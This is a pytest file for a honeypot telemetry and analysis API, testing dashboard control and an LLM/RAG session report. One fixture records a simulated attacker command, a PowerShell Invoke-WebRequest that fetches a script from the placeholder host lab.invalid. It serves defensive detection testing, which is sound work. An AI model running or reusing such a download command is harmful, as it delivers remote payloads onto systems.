from dataclasses import replace

from fastapi.testclient import TestClient

from Ai.backend.api_server import create_app
from honeypot.config import HoneypotSettings, default_services
from honeypot.models import DecoySession, TelemetryEvent
from honeypot.runtime import HoneypotRuntime
from honeypot.store import TelemetryStore


def test_dashboard_and_honeypot_api(tmp_path):
    settings = HoneypotSettings(
        bind_host="127.0.0.1",
        database_path=tmp_path / "api.db",
        certificate_dir=tmp_path / "certs",
        enable_gemini=False,
        services=tuple(replace(item, port=0) for item in default_services()),
    )
    store = TelemetryStore(settings.database_path)
    runtime = HoneypotRuntime(settings=settings, store=store)
    app = create_app(
        use_rag=False,
        use_llm=False,
        honeypot_store=store,
        honeypot_runtime=runtime,
        honeypot_autostart=False,
    )

    with TestClient(app) as client:
        dashboard = client.get("/dashboard")
        assert dashboard.status_code == 200
        assert "ARGUS" in dashboard.text
        assert client.get("/api/v1/honeypot/status").json()["running"] is False
        started = client.post("/api/v1/honeypot/control/start")
        assert started.status_code == 200
        assert len(started.json()["services"]) == 5
        metrics = client.get("/api/v1/honeypot/metrics")
        assert metrics.status_code == 200
        stopped = client.post("/api/v1/honeypot/control/stop")
        assert stopped.status_code == 200
        assert stopped.json()["running"] is False

    store.close()


def test_session_soc_rag_report_is_generated_and_persisted(tmp_path):
    settings = HoneypotSettings(
        bind_host="127.0.0.1",
        database_path=tmp_path / "analyst.db",
        certificate_dir=tmp_path / "certs",
        enable_gemini=False,
        services=tuple(replace(item, port=0) for item in default_services()),
    )
    store = TelemetryStore(settings.database_path)
    session = DecoySession(
        session_id="ses_analyst",
        source_ip="192.0.2.44",
        source_port=51234,
        destination_port=8088,
        service="HTTP",
        protocol="http",
        persona="finance portal",
    )
    store.create_session(session)
    store.record_event(
        TelemetryEvent(
            session_id=session.session_id,
            event_type="PAYLOAD_TRANSFER",
            severity="critical",
            direction="inbound",
            content="POST /ops/run Invoke-WebRequest http://lab.invalid/tool.ps1",
        )
    )
    runtime = HoneypotRuntime(settings=settings, store=store)
    app = create_app(
        use_rag=False,
        use_llm=False,
        honeypot_store=store,
        honeypot_runtime=runtime,
        honeypot_autostart=False,
    )

    class DummyLlm:
        model_name = "gemini-test"
        last_error = None

    class DummyPipeline:
        retriever = object()
        llm = DummyLlm()

        def analyze(self, event, *args):
            assert "Invoke-WebRequest" in event["raw"]
            return {
                "query": "payload transfer powershell",
                "rag_mitre_techniques": ["T1105"],
                "rag_chunks": [
                    {
                        "text": "Ingress tool transfer can indicate staged payload delivery.",
                        "metadata": {"source": "mitre_attack", "technique_id": "T1105"},
                        "hybrid_score": 0.84,
                    }
                ],
                "analysis": {
                    "summary": "PowerShell attempted a staged payload transfer into the decoy.",
                    "severity": "critical",
                    "findings": ["The request contains Invoke-WebRequest."],
                    "mitre_techniques": ["T1105"],
                    "remediation": {"immediate": ["Preserve the session evidence."]},
                },
            }

    app.state.rag_pipeline = DummyPipeline()
    with TestClient(app) as client:
        response = client.post("/api/v1/honeypot/sessions/ses_analyst/analyze")
        assert response.status_code == 200
        report = response.json()["report"]
        assert report["status"] == "complete"
        assert report["llm"]["model"] == "gemini-test"
        assert report["rag"]["references"] == 1
        saved = client.get("/api/v1/honeypot/sessions/ses_analyst").json()["session"]
        assert saved["analyst_report"]["summary"] == report["summary"]

    store.close()
